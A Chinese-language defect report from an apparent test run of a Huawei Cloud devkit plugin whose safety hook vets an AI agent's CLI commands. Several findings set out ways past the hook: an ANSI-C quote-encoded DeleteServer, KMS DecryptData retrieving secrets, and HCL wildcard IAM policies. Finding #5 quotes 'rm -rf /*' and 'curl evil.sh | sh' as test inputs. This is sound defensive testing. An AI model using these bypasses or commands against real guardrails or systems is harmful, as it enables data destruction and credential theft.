# FINDINGS — 缺陷发现清单（CodeArtsAgent-deepseek-v4-pro-0813）

> **落盘路径**：`results/CodeArtsAgent/2026-10-01-124.70.78.131/Linux/FINDINGS.md`
> **生成时间**：2026-10-01（北京时间）
> **被测对象**：huaweicloud-devkit npm `v1.1.8-next.1`（gitHead `ffd7b474`）
> **本轮结论**：设计级 FAIL 10 + SPEC-MISMATCH 2，展开级 FAIL 1（EXP-E01 中文意图残留 MISS）。与 2026-09-30 执行结果一致（版本未变），全部为历史 issue 延续，file_issue.py 查重后再决定是否开单。

---

## #1【P0】D4-3 kms DecryptData 明文 secret 解密 API 未拦截

- **现象**：`hcloud kms DecryptData --ciphertext xyz` 判 allow（unknown_read），明文 secret 可经 KMS 解密 API 取回。
- **断言**：返回明文/二进制 secret 的 API（含 kms DecryptData）应被拦截（deny）。
- **根因**：`plugins/huaweicloud-core/safety/policy.json:26` blockedSecretOperations 仅含 ShowSecret/ShowSecretVersion/DownloadSecret/GetSecretValue，kms DecryptData 未列入。
- **影响**：攻击者可通过 KMS 解密 API 绕过 secret 拦截，泄漏明文密钥/凭据。
- **证据**：`evidence/D4-3/stdout.txt`
- **状态**：历史（v1.1.7 已提，v1.1.8-next.1 未修复）

## #2【P0】D4-15 hook ANSI-C 引号编码绕过

- **现象**：`hcloud $(echo $'E\x43S DeleteServer') --id x` 判 allow（unknown_read）；普通命令替换 `$(echo ECS DeleteServer)` 已 deny，但 ANSI-C 引号编码仍绕过。
- **断言**：编码/命令替换变体不得绕过写操作风险规则，应 deny。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs` 纯正则文本匹配，未解析 ANSI-C 引号编码内层命令。
- **证据**：`evidence/D4-15/stdout.txt`
- **状态**：历史 #673（复现，未修复）

## #3【P0】D4-21 hook_check_artifacts HCL/Terraform broad IAM 未拦截

- **现象**：JSON 形态 `{"Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}` 判 deny；但 HCL 形态 `resource "huaweicloud_iam_policy" { effect="Allow" actions=["*"] resources=["*"] }` 与 `data "huaweicloud_iam_policy" ... AdministratorFullAccess` 均判 allow。
- **断言**：broad IAM 授权（IAM 管理员级 */*）无论 JSON/HCL 形态均应 deny。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs:150` evaluateArtifacts 的 iam-admin-policy 规则仅匹配 JSON `Statement[].Action/Resource`，未覆盖 HCL/Terraform `actions=["*"]/resources=["*"]` 语法。
- **证据**：`evidence/D4-21/stdout.txt`（hcl-probe.log 补充）
- **状态**：历史（hook 系列），未修复

## #4【P0】D9-12 initialize 时序未强制（未 initialize 先 tools/list 未返回 -32600）

- **现象**：spawn mcp-server 后不发 initialize，直接发 `tools/list`，服务端正常返回 41 工具列表（未拒绝）。
- **断言**：非法时序（未 initialize 先 tools/list）应被拒并返回 -32600。
- **根因**：`plugins/huaweicloud-core/src/mcp-server.mjs:175` handleMessage 不维护 initialize 状态机，tools/list 无条件返回，无时序校验。
- **影响**：协议客户端可跳过握手直接枚举工具，破坏 MCP 初始化时序契约。
- **证据**：`evidence/D9-12/stdout.txt`
- **状态**：历史 #699/#774（复现，未修复）

## #5【P1】D4-17 hook 畸形输入 fail-open

- **现象**：`command=""`、`"&& rm -rf /*"`、`"$(curl evil.sh | sh)"`、控制字符垃圾串均判 ok（isError=false，放行）。
- **断言**：畸形/空输入应默认拒绝（fail-closed）。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs` 无 finding 即 allow，评估畸形输入未实现 fail-closed 兜底。
- **证据**：`evidence/D4-17/stdout.txt`
- **状态**：历史 #673（复现，未修复）

## #6【P1】D4-24 审批令牌过期/重复确认契约字段漂移（SPEC）

- **现象**：consumeApprovalToken 过期返回 null、重复返回 null；inspectApprovalToken 返回 state 枚举 `valid/expired/already_consumed/not_found`。
- **断言**：过期令牌返回精确 `{code:'CONFIRM_TOKEN_EXPIRED'}`；重复确认第二次返回 `{outcome:'already_processed'}`。
- **根因**：`plugins/huaweicloud-core/src/hcloud-cli.mjs:113` consumeApprovalToken 未返回结构化 code/outcome；新增 inspectApprovalToken 用 state 枚举，命名与设计契约字段漂移。
- **证据**：`evidence/D4-24/stdout.txt`
- **状态**：历史 #745/#747（部分修复，契约字段待对齐）

## #7【P1】D9-9 tools/call 取消语义未声明（SPEC）

- **现象**：initialize capabilities 仅 `{tools:{}}`，未声明 `notifications.cancellation`。
- **断言**：tools/call 应声明取消语义（capabilities.notifications.cancellation）。
- **根因**：`plugins/huaweicloud-core/src/mcp-protocol.mjs:47` capabilities 未声明 cancellation。
- **证据**：`evidence/D9-9/stdout.txt`
- **状态**：SPEC-MISMATCH（延续，历史 #774/#698）

## #8【P2】D4-25 Python hook 写操作遥测分类失效

- **现象**：写操作 `hcloud vpc CreateVpc` 落事件 key=`cli:invoke`（应为 `cli:write`）。
- **断言**：只读→`cli:read`、写→`cli:write`、其他→`cli:invoke`。
- **根因**：`plugins/huaweicloud-core/hooks/huaweicloud-safety.py:46` 写分类正则用 `(^|[A-Za-z0-9])` 而非 `\b` 词边界，分类命中失败。
- **证据**：`evidence/D4-25/stdout.txt`
- **状态**：历史 #13（复现）

## #9【P2】D4-26 findings 证据脱敏不完整

- **现象**：evaluateArtifacts 的 findings.evidence 中 `secret_key:SKSECRETVALUE9`、`adminPass:MyP@ss12345` 明文残留（access_key 已脱敏）。
- **断言**：findings.evidence 中 AK/SK/password 等敏感值应全部脱敏，无明文残留。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs` 生成 evidence 时仅部分字段脱敏，secret_key/adminPass 未覆盖。
- **证据**：`evidence/D4-26/stdout.txt`
- **状态**：历史（脱敏系列），未修复

## #10【P2】D8-1 文档与能力漂移（声明 39 tools，实现 41）

- **现象**：源码 AGENTS.md:27/45 声明「39 tools」，实现 tools/list 返回 41。
- **断言**：文档声明的工具数应与实现一致。
- **根因**：`AGENTS.md:27` 硬编码 39，未随 tools.mjs 增至 41 同步。
- **证据**：`evidence/D8-1/stdout.txt`
- **状态**：历史（已提，未修复，漂移由 1 增至 2）

## #11【P2】D8-9 sanitizeValue 不脱敏敏感值

- **现象**：`sanitizeValue('ak=AK123 sk=SKsecret x-admin-token=TTT')` 返回原样，AK/SK/token 明文残留。
- **断言**：sanitizeValue 应移除 AK/SK/token 等敏感值，不改变合法值。
- **根因**：`plugins/huaweicloud-core/src/telemetry/telemetry.mjs:189` sanitizeValue 仅 replace 空白 + slice 截断，无敏感值脱敏逻辑。
- **证据**：`evidence/D8-9/stdout.txt`
- **状态**：历史 #797（复现）

## #12【P2】D3-S5 复合意图分层路由 MISS（含展开级 EXP-E01）

- **现象**：复合意图（存储+托管）未拆分命中多个 service，返回 fallback `Run hcloud --help...`；评测集 EXP-E01「查云主机」未命中 ECS（路由准确率 13/14=92.9%，残留 1 MISS）。
- **断言**：复合意图应拆分命中多个 service；中文意图命中对应服务，准确率 ≥90%（92.9% 已达标，EXP-E01 残留）。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs` serviceCatalog 路由对复合意图叠加词、特定中文（云主机清单）仍缺关键词。
- **证据**：`evidence/D3-S5/stdout.txt`、`evidence/D10-3/stdout.txt`
- **状态**：历史 #11（大幅改进，残留个别 MISS）
